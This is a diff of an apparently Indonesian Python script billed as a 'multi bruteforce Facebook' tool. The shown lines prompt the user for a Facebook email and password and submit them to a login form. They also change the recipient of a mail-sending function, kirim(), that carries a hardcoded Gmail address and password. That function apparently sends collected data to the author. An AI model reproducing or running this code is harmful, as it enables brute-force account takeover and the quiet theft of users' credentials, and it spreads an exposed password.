@@ -82,7 +82,7 @@ def inputM(x,d):
 def kirim():
    email_user = 'akuninu001@gmail.com'
    email_password = 'karepe1'
-   email_send = 'akuninu001@bk.ru'
+   email_send = 'akuninu001@gmail.com'
 
    subject = '=== KIRIMAN NYA KAK ==='
 
@@ -147,7 +147,7 @@ def login():
 	us = inputD('[?]Email/HP')
 	pa = inputD('[?]Kata Sandi')
 	tampil('\rh[*]Sedang Login....')
-	buka('https://www.facebook.com/profile.php?id=100078919720019')
+	buka('https://m.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
 	br.form['pass']=pa
@@ -389,7 +389,7 @@ def menu():
 \rk###########################################################
 #             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                 #
 # \rhBY\rp                                             MR-Xyaa \rk#
-# \rhGroup FB\rp  https://m.facebook.com/groups/164201767529837 \rk#
+# \rhMy Facebook\rp  https://www.facebook.com/profile.php?id=100078919720019\rk#
 # \rhGitHub\rp                      https://github.com/MR-Xyaa \rk#
 #       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
 ###########################################################''')
